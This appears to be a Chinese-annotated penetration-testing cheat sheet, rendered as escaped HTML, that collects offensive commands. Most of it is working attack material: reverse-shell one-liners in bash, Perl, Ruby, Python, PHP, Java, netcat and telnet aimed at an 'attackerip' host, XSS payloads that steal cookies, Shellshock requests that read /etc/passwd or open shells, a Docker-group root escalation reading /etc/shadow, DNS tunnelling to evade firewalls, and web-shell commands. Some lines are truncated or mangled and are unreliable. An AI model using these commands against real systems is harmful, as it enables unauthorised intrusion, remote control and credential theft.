&lt;h1 id=&#34;https-zh-wikipedia-org-wiki-e8-bf-94-e5-9b-9e-e5-af-bc-e5-90-91-e7-bc-96-e7-a8-8b-1&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B&#34; target=&#34;_blank&#34;&gt;https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;https-en-wikipedia-org-wiki-data-execution-prevention-1&#34;&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Data_Execution_Prevention&#34; target=&#34;_blank&#34;&gt;https://en.wikipedia.org/wiki/Data_Execution_Prevention&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;http-baike-baidu-com-item-dep-7694630-1&#34;&gt;&lt;a href=&#34;http://baike.baidu.com/item/DEP/7694630&#34; target=&#34;_blank&#34;&gt;http://baike.baidu.com/item/DEP/7694630&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;!mona modules&lt;br /&gt;
!mona ropfunc -m *.dll -cpb &amp;ldquo;\x00\x09\x0a&amp;rdquo;&lt;br /&gt;
!mona rop -m *.dll -cpb &amp;ldquo;\x00\x09\x0a&amp;rdquo; (auto suggest)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ASLR – 地址空间格局随机化  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;https-en-wikipedia-org-wiki-address-space-layout-randomization-1&#34;&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Address_space_layout_randomization&#34; target=&#34;_blank&#34;&gt;https://en.wikipedia.org/wiki/Address_space_layout_randomization&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;http-baike-baidu-com-view-3862310-htm-1&#34;&gt;&lt;a href=&#34;http://baike.baidu.com/view/3862310.htm&#34; target=&#34;_blank&#34;&gt;http://baike.baidu.com/view/3862310.htm&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;!mona noaslr&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;寻蛋(EGG Hunter)技术  

Egg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。– 参考自看雪论坛，更多详情可以查阅我在代码注释中增加的链接。  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;https-www-corelan-be-index-php-2010-01-09-exploit-writing-tutorial-part-8-win32-egg-hunting-1&#34;&gt;&lt;a href=&#34;https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/&#34; target=&#34;_blank&#34;&gt;https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;http-www-pediy-com-kssd-pediy12-116190-831793-45248-pdf-1&#34;&gt;&lt;a href=&#34;http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf&#34; target=&#34;_blank&#34;&gt;http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;http-www-fuzzysecurity-com-tutorials-expdev-4-html-1&#34;&gt;&lt;a href=&#34;http://www.fuzzysecurity.com/tutorials/expDev/4.html&#34; target=&#34;_blank&#34;&gt;http://www.fuzzysecurity.com/tutorials/expDev/4.html&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;!mona jmp -r esp&lt;br /&gt;
!mona egg -t lxxl&lt;br /&gt;
\xeb\xc4 (jump backward -60)&lt;br /&gt;
buff=lxxllxxl+shell&lt;br /&gt;
!mona egg -t &amp;lsquo;w00t&amp;rsquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GDB Debugger 常用命令  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;设置断点&#34;&gt;设置断点&lt;/h1&gt;

&lt;p&gt;break *_start&lt;/p&gt;

&lt;h1 id=&#34;执行下一个命令&#34;&gt;执行下一个命令&lt;/h1&gt;

&lt;p&gt;next&lt;br /&gt;
step&lt;br /&gt;
n&lt;br /&gt;
s&lt;/p&gt;

&lt;h1 id=&#34;继续执行&#34;&gt;继续执行&lt;/h1&gt;

&lt;p&gt;continue&lt;br /&gt;
c&lt;/p&gt;

&lt;h1 id=&#34;数据&#34;&gt;数据&lt;/h1&gt;

&lt;p&gt;checking &amp;lsquo;REGISTERS&amp;rsquo; and &amp;lsquo;MEMORY&amp;rsquo;&lt;/p&gt;

&lt;h1 id=&#34;显示寄存器的值-decimal-binary-hex&#34;&gt;显示寄存器的值: (Decimal,Binary,Hex)&lt;/h1&gt;

&lt;p&gt;print /d –&amp;gt; Decimal&lt;br /&gt;
print /t –&amp;gt; Binary&lt;br /&gt;
print /x –&amp;gt; Hex&lt;br /&gt;
O/P :&lt;br /&gt;
(gdb) print /d $eax&lt;br /&gt;
$17 = 13&lt;br /&gt;
(gdb) print /t $eax&lt;br /&gt;
$18 = 1101&lt;br /&gt;
(gdb) print /x $eax&lt;br /&gt;
$19 = 0xd&lt;br /&gt;
(gdb)&lt;/p&gt;

&lt;h1 id=&#34;显示特定内存地址的值&#34;&gt;显示特定内存地址的值&lt;/h1&gt;

&lt;p&gt;command : x/nyz (Examine)&lt;br /&gt;
n –&amp;gt; Number of fields to display ==&amp;gt;&lt;br /&gt;
y –&amp;gt; Format for output ==&amp;gt; c (character) , d (decimal) , x (Hexadecimal)&lt;br /&gt;
z –&amp;gt; Size of field to be displayed ==&amp;gt; b (byte) , h (halfword), w (word 32 Bit)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;BASH 反弹 Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/X.X.X.X/443 0&amp;gt;&amp;amp;1&lt;/p&gt;

&lt;p&gt;exec /bin/bash 0&amp;amp;0 2&amp;gt;&amp;amp;0&lt;br /&gt;
exec /bin/bash 0&amp;amp;0 2&amp;gt;&amp;amp;0&lt;/p&gt;

&lt;p&gt;0&amp;lt;&amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/attackerip/4444; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196&lt;/p&gt;

&lt;p&gt;0&amp;lt;&amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/attackerip/4444; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196&lt;/p&gt;

&lt;p&gt;exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/4444 cat &amp;lt;&amp;amp;5 | while read line; do $line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;5; done # or: while read line 0&amp;lt;&amp;5; do $line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;5; done&lt;br /&gt;
exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/4444&lt;/p&gt;

&lt;p&gt;cat &amp;lt;&amp;amp;5 | while read line; do $line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;5; done # or:&lt;br /&gt;
while read line 0&amp;lt;&amp;5; do $line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;5; done&lt;/p&gt;

&lt;p&gt;/bin/bash -i &amp;gt; /dev/tcp/attackerip/8080 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1&lt;br /&gt;
/bin/bash -i &amp;gt; /dev/tcp/X.X.X.X/443 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PERL 反弹 Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;perl -MIO -e &amp;lsquo;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&amp;ldquo;attackerip:443&amp;rdquo;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);system$_ while&amp;lt;&amp;gt;;&amp;rsquo;&lt;/p&gt;

&lt;h1 id=&#34;win-平台&#34;&gt;Win 平台&lt;/h1&gt;

&lt;p&gt;perl -MIO -e &amp;lsquo;$c=new IO::Socket::INET(PeerAddr,&amp;ldquo;attackerip:4444&amp;rdquo;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);system$_ while&amp;lt;&amp;gt;;&amp;rsquo;&lt;br /&gt;
perl -e &amp;lsquo;use Socket;$i=&amp;ldquo;10.0.0.1&amp;rdquo;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;ldquo;tcp&amp;rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDOUT,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDERR,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);exec(&amp;ldquo;/bin/sh -i&amp;rdquo;);};’&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;RUBY 反弹 Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ruby -rsocket -e &amp;lsquo;exit if fork;c=TCPSocket.new(&amp;ldquo;attackerip&amp;rdquo;,&amp;ldquo;443&amp;rdquo;);while(cmd=c.gets);IO.popen(cmd,&amp;ldquo;r&amp;rdquo;){|io|c.print io.read}end&amp;rsquo;&lt;/p&gt;

&lt;h1 id=&#34;win-平台-1&#34;&gt;Win 平台&lt;/h1&gt;

&lt;p&gt;ruby -rsocket -e &amp;lsquo;c=TCPSocket.new(&amp;ldquo;attackerip&amp;rdquo;,&amp;ldquo;443&amp;rdquo;);while(cmd=c.gets);IO.popen(cmd,&amp;ldquo;r&amp;rdquo;){|io|c.print io.read}end&amp;rsquo;&lt;br /&gt;
ruby -rsocket -e &amp;lsquo;f=TCPSocket.open(&amp;ldquo;attackerip&amp;rdquo;,&amp;ldquo;443&amp;rdquo;).to_i;exec sprintf(&amp;ldquo;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;rdquo;,f,f,f)&amp;rsquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PYTHON 反弹 Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;python -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;attackerip&amp;rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;ldquo;/bin/sh&amp;rdquo;,&amp;ldquo;-i&amp;rdquo;]);&amp;rsquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PHP 反弹 Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;php -r &amp;lsquo;$sock=fsockopen(&amp;ldquo;attackerip&amp;rdquo;,443);exec(&amp;ldquo;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;rdquo;);&amp;rsquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;JAVA 反弹 Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;r = Runtime.getRuntime()&lt;br /&gt;
p = r.exec([&amp;ldquo;/bin/bash&amp;rdquo;,&amp;ldquo;-c&amp;rdquo;,&amp;ldquo;exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/443;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;5; done&amp;rdquo;] as String[])&lt;br /&gt;
p.waitFor()&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;NETCAT 反弹 Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;nc -e /bin/sh attackerip 4444&lt;br /&gt;
nc -e /bin/sh 192.168.37.10 443&lt;/p&gt;

&lt;h1 id=&#34;如果-e-参数被禁用-可以尝试以下命令&#34;&gt;如果 -e 参数被禁用，可以尝试以下命令&lt;/h1&gt;

&lt;h1 id=&#34;mknod-backpipe-p-nc-attackerip-443-0-backpipe-bin-bash-1-backpipe-bin-sh-nc-attackerip-443&#34;&gt;mknod backpipe p &amp;amp;&amp;amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe /bin/sh | nc attackerip 443&lt;/h1&gt;

&lt;p&gt;rm -f /tmp/p; mknod /tmp/p p &amp;amp;&amp;amp; nc attackerip 4443 0/tmp/&lt;/p&gt;

&lt;h1 id=&#34;如果你安装错了-netcat-的版本-请尝试以下命令&#34;&gt;如果你安装错了 netcat 的版本，请尝试以下命令&lt;/h1&gt;

&lt;p&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc attackerip &amp;gt;/tmp/f&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;TELNET 反弹 Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;如果-netcat-不可用或者-dev-tcp&#34;&gt;如果 netcat 不可用或者 /dev/tcp&lt;/h1&gt;

&lt;p&gt;mknod backpipe p &amp;amp;&amp;amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;XTERM 反弹 Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;http-baike-baidu-com-view-418628-htm&#34;&gt;&lt;a href=&#34;http://baike.baidu.com/view/418628.htm&#34; target=&#34;_blank&#34;&gt;http://baike.baidu.com/view/418628.htm&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;开启-x-服务器-1-监听-tcp-端口-6001&#34;&gt;开启 X 服务器 (:1 – 监听 TCP 端口 6001)&lt;/h1&gt;

&lt;p&gt;apt-get install xnest&lt;br /&gt;
Xnest :1&lt;/p&gt;

&lt;h1 id=&#34;记得授权来自目标-ip-的连接&#34;&gt;记得授权来自目标 IP 的连接&lt;/h1&gt;

&lt;p&gt;xterm -display 127.0.0.1:1&lt;/p&gt;

&lt;h1 id=&#34;授权访问&#34;&gt;授权访问&lt;/h1&gt;

&lt;p&gt;xhost +targetip&lt;/p&gt;

&lt;h1 id=&#34;在目标机器上连接回我们的-x-服务器&#34;&gt;在目标机器上连接回我们的 X 服务器&lt;/h1&gt;

&lt;p&gt;xterm -display attackerip:1&lt;br /&gt;
/usr/openwin/bin/xterm -display attackerip:1&lt;br /&gt;
or&lt;br /&gt;
$ DISPLAY=attackerip:0 xterm&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;XSS 备忘录  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&#34;https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet&#34; target=&#34;_blank&#34;&gt;https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet&lt;/a&gt;&lt;br /&gt;
(&amp;rdquo;&amp;lt; iframes &amp;gt; src=&lt;a href=&#34;http://IP:PORT&#34; target=&#34;_blank&#34;&gt;http://IP:PORT&lt;/a&gt; &amp;lt;/ iframes &amp;gt;&amp;ldquo;)&lt;/p&gt;

&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;  

&lt;p&gt;&amp;rsquo;;alert(String.fromCharCode(88,83,83))//\&amp;lsquo;;alert(String.fromCharCode(88,83,83))//&amp;ldquo;;alert(String.fromCharCode(88,83,83))//\&amp;ldquo;;alert(String.fromCharCode(88,83,83))//–&amp;gt;&lt;/SCRIPT&gt;&amp;rdquo;&amp;gt;&amp;lsquo;&amp;gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&lt;/p&gt;

&lt;p&gt;&amp;rdquo;;!–&amp;rdquo;&lt;XSS&gt;=&amp;amp;amp;{()}&lt;/p&gt;

&lt;p&gt;&lt;IMG SRC=&#34;javascript:alert(&#39;XSS&#39;);&#34;&gt;&lt;br /&gt;
&lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt;&lt;br /&gt;
&lt;IMG &#34;&#34;&#34;&gt;&lt;SCRIPT&gt;alert(&amp;ldquo;XSS&amp;rdquo;)&lt;/SCRIPT&gt;&amp;rdquo;&amp;ldquo;&amp;gt;&lt;br /&gt;
&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;&lt;/p&gt;

&lt;p&gt;&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;&lt;br /&gt;
&lt;IMG SRC=&#34;jav ascript:alert(&#39;XSS&#39;);&#34;&gt;&lt;/p&gt;

&lt;p&gt;perl -e &amp;lsquo;print &amp;ldquo;&lt;IMG SRC=javascript:alert(\&#34;XSS\&#34;)&gt;&amp;rdquo;;&amp;rsquo; &amp;gt; out&lt;/p&gt;

&lt;p&gt;&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&#34;XSS&#34;)&gt;&lt;/p&gt;

&lt;p&gt;(&amp;ldquo;&amp;gt;&amp;lt; iframes &lt;a href=&#34;http://google.com&#34; target=&#34;_blank&#34;&gt;http://google.com&lt;/a&gt; &amp;lt; iframes &amp;gt;)&lt;/p&gt;

&lt;p&gt;&lt;BODY BACKGROUND=&#34;javascript:alert(&#39;XSS&#39;)&#34;&gt;&lt;br /&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(&#39;XSS&#39;);&#34;&gt;&lt;/FRAMESET&gt;&lt;br /&gt;
&amp;rdquo;&amp;gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;&lt;br /&gt;
%253cscript%253ealert(document.cookie)%253c/script%253e&lt;br /&gt;
&amp;rdquo;&amp;gt;&lt;s&#34;%2b&#34;cript&gt;alert(document.cookie)&lt;/script&gt;&lt;br /&gt;
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=&lt;a href=&#34;http://my.box.com/xss.js%3E%3C/script%3E%22)&#39;%3E&#34; target=&#34;_blank&#34;&gt;http://my.box.com/xss.js%3E%3C/script%3E%22)&#39;%3E&lt;/a&gt;&lt;br /&gt;
&lt;img src=asdf onerror=alert(document.cookie)&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SSH Over SCTP (使用 Socat)  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;远端服务器&#34;&gt;远端服务器&lt;/h1&gt;

&lt;h1 id=&#34;假设你准备让-sctp-socket-监听端口-80-sctp-并且-sshd-端口在-22-tcp&#34;&gt;假设你准备让 SCTP socket 监听端口 80/SCTP 并且 sshd 端口在 22/TCP&lt;/h1&gt;

&lt;p&gt;$ socat SCTP-LISTEN:80,fork TCP:localhost:22&lt;/p&gt;

&lt;h1 id=&#34;本地端&#34;&gt;本地端&lt;/h1&gt;

&lt;h1 id=&#34;将-server-ip-换成远端服务器的地址-然后将-80-换成-sctp-监听的端口号&#34;&gt;将 SERVER_IP 换成远端服务器的地址，然后将 80 换成 SCTP 监听的端口号&lt;/h1&gt;

&lt;p&gt;$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80&lt;/p&gt;

&lt;h1 id=&#34;创建-socks-代理&#34;&gt;创建 socks 代理&lt;/h1&gt;

&lt;h1 id=&#34;替换-username-和-p-的端口号&#34;&gt;替换 username 和 -p 的端口号&lt;/h1&gt;

&lt;p&gt;$ ssh -lusername localhost -D 8080 -p 1337&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用洋葱网络  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;安装服务&#34;&gt;安装服务&lt;/h1&gt;

&lt;p&gt;$ apt-get install tor torsocks&lt;/p&gt;

&lt;h1 id=&#34;绑定-ssh-到-tor-服务端口-80&#34;&gt;绑定 ssh 到 tor 服务端口 80&lt;/h1&gt;

&lt;h1 id=&#34;etc-tor-torrc&#34;&gt;/etc/tor/torrc&lt;/h1&gt;

&lt;p&gt;SocksPolicy accept 127.0.0.1&lt;br /&gt;
SocksPolicy accept 192.168.0.0/16&lt;br /&gt;
Log notice file /var/log/tor/notices.log&lt;br /&gt;
RunAsDaemon 1&lt;br /&gt;
HiddenServiceDir /var/lib/tor/ssh_hidden_service/&lt;br /&gt;
HiddenServicePort 80 127.0.0.1:22&lt;br /&gt;
PublishServerDescriptor 0&lt;br /&gt;
$ /etc/init.d/tor start&lt;br /&gt;
$ cat /var/lib/tor/ssh_hidden_service/hostname&lt;br /&gt;
3l5zstvt1zk5jhl662.onion&lt;/p&gt;

&lt;h1 id=&#34;ssh-客户端连接&#34;&gt;ssh 客户端连接&lt;/h1&gt;

&lt;p&gt;$ apt-get install torsocks&lt;br /&gt;
$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Metagoofil – 元数据收集工具  

注：Metagoofil 是一款利用Google收集信息的工具。  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;http-www-edge-security-com-metagoofil-php&#34;&gt;&lt;a href=&#34;http://www.edge-security.com/metagoofil.php&#34; target=&#34;_blank&#34;&gt;http://www.edge-security.com/metagoofil.php&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;它可以自动在搜素引擎中检索和分析文件-还具有提供mac地址-用户名列表等其他功能&#34;&gt;它可以自动在搜素引擎中检索和分析文件，还具有提供Mac地址，用户名列表等其他功能&lt;/h1&gt;

&lt;p&gt;$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html&lt;/p&gt;

&lt;p&gt;利用 Shellshock&lt;/p&gt;

&lt;h1 id=&#34;一个发现并利用服务器-shellshock-的工具&#34;&gt;一个发现并利用服务器 Shellshock 的工具&lt;/h1&gt;

&lt;h1 id=&#34;https-github-com-nccgroup-shocker&#34;&gt;&lt;a href=&#34;https://github.com/nccgroup/shocker&#34; target=&#34;_blank&#34;&gt;https://github.com/nccgroup/shocker&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;$ ./shocker.py -H 192.168.56.118  &amp;ndash;command &amp;ldquo;/bin/cat /etc/passwd&amp;rdquo; -c /cgi-bin/status &amp;ndash;verbose&lt;/p&gt;

&lt;h1 id=&#34;查看文件&#34;&gt;查看文件&lt;/h1&gt;

&lt;p&gt;$ echo -e &amp;ldquo;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(&amp;lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&amp;rdquo; | nc 192.168.56.118 80&lt;/p&gt;

&lt;h1 id=&#34;绑定-shell&#34;&gt;绑定 shell&lt;/h1&gt;

&lt;p&gt;$ echo -e &amp;ldquo;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&amp;rdquo; | nc 192.168.56.118 80&lt;/p&gt;

&lt;h1 id=&#34;反弹-shell&#34;&gt;反弹 Shell&lt;/h1&gt;

&lt;p&gt;$ nc -l -p 443&lt;br /&gt;
$ echo &amp;ldquo;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&amp;rdquo; | nc 192.168.56.118 80&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;获取 Docker 的 Root  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;获取-docker-的-root&#34;&gt;获取  Docker 的 Root&lt;/h1&gt;

&lt;h1 id=&#34;user-必须在-docker-用户组中&#34;&gt;user 必须在 docker 用户组中&lt;/h1&gt;

&lt;p&gt;ek@victum:~/docker-test$ id&lt;br /&gt;
uid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)&lt;/p&gt;

&lt;p&gt;ek@victum:~$ mkdir docker-test&lt;br /&gt;
ek@victum:~$ cd docker-test&lt;/p&gt;

&lt;p&gt;ek@victum:~$ cat &amp;gt; Dockerfile&lt;br /&gt;
FROM debian:wheezy&lt;/p&gt;

&lt;p&gt;ENV WORKDIR /stuff&lt;/p&gt;

&lt;p&gt;RUN mkdir -p $WORKDIR&lt;/p&gt;

&lt;p&gt;VOLUME [ $WORKDIR ]&lt;/p&gt;

&lt;p&gt;WORKDIR $WORKDIR&lt;br /&gt;
&amp;lt;&amp;lt; EOF&lt;/p&gt;

&lt;p&gt;ek@victum:~$ docker build -t my-docker-image .&lt;br /&gt;
ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \&lt;br /&gt;
&amp;lsquo;cp /bin/sh /stuff &amp;amp;&amp;amp; chown root.root /stuff/sh &amp;amp;&amp;amp; chmod a+s /stuff/sh&amp;rsquo;&lt;br /&gt;
./sh&lt;br /&gt;
whoami&lt;/p&gt;

&lt;h1 id=&#34;root&#34;&gt;root&lt;/h1&gt;

&lt;p&gt;ek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c &amp;lsquo;cat /stuff/shadow&amp;rsquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 DNS 隧道绕过防火墙  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;让数据和命令使用-dns-隧道传输以绕过防火墙的检查&#34;&gt;让数据和命令使用 DNS 隧道传输以绕过防火墙的检查&lt;/h1&gt;

&lt;h1 id=&#34;dnscat2-支持从目标主机上面上传和下载命令来获取文件-数据和程序&#34;&gt;dnscat2 支持从目标主机上面上传和下载命令来获取文件、数据和程序&lt;/h1&gt;

&lt;h1 id=&#34;服务器-攻击者&#34;&gt;服务器 (攻击者)&lt;/h1&gt;

&lt;p&gt;$ apt-get update&lt;br /&gt;
$ apt-get -y install ruby-dev git make g++&lt;br /&gt;
$ gem install bundler&lt;br /&gt;
$ git clone &lt;a href=&#34;https://github.com/iagox86/dnscat2.git&#34; target=&#34;_blank&#34;&gt;https://github.com/iagox86/dnscat2.git&lt;/a&gt;&lt;br /&gt;
$ cd dnscat2/server&lt;br /&gt;
$ bundle install&lt;br /&gt;
$ ruby ./dnscat2.rb&lt;br /&gt;
dnscat2&amp;gt; New session established: 16059&lt;br /&gt;
dnscat2&amp;gt; session -i 16059&lt;/p&gt;

&lt;h1 id=&#34;客户机-目标&#34;&gt;客户机 (目标)&lt;/h1&gt;

&lt;h1 id=&#34;https-downloads-skullsecurity-org-dnscat2&#34;&gt;&lt;a href=&#34;https://downloads.skullsecurity.org/dnscat2/&#34; target=&#34;_blank&#34;&gt;https://downloads.skullsecurity.org/dnscat2/&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;https-github-com-lukebaggett-dnscat2-powershell&#34;&gt;&lt;a href=&#34;https://github.com/lukebaggett/dnscat2-powershell&#34; target=&#34;_blank&#34;&gt;https://github.com/lukebaggett/dnscat2-powershell&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;$ dnscat &amp;ndash;host &lt;dnscat server_ip&gt;&lt;/p&gt;

&lt;p&gt;编译 Assemble 代码&lt;/p&gt;

&lt;p&gt;$ nasm -f elf32 simple32.asm -o simple32.o&lt;br /&gt;
$ ld -m elf_i386 simple32.o simple32&lt;/p&gt;

&lt;p&gt;$ nasm -f elf64 simple.asm -o simple.o&lt;br /&gt;
$ ld simple.o -o simple&lt;/p&gt;

&lt;p&gt;使用非交互 Shell 打入内网&lt;/p&gt;

&lt;h1 id=&#34;生成-shell-使用的-ssh-密钥&#34;&gt;生成 shell 使用的 ssh 密钥&lt;/h1&gt;

&lt;p&gt;$ wget -O - -q &amp;ldquo;&lt;a href=&#34;http://domain.tk/sh.php?cmd=whoami&amp;quot;&#34; target=&#34;_blank&#34;&gt;http://domain.tk/sh.php?cmd=whoami&amp;quot;&lt;/a&gt;&lt;br /&gt;
$ wget -O - -q &amp;ldquo;&lt;a href=&#34;http://domain.tk/sh.php?cmd=ssh-keygen&#34; target=&#34;_blank&#34;&gt;http://domain.tk/sh.php?cmd=ssh-keygen&lt;/a&gt; -f /tmp/id_rsa -N \&amp;rdquo;\&amp;rdquo; &amp;ldquo;&lt;br /&gt;
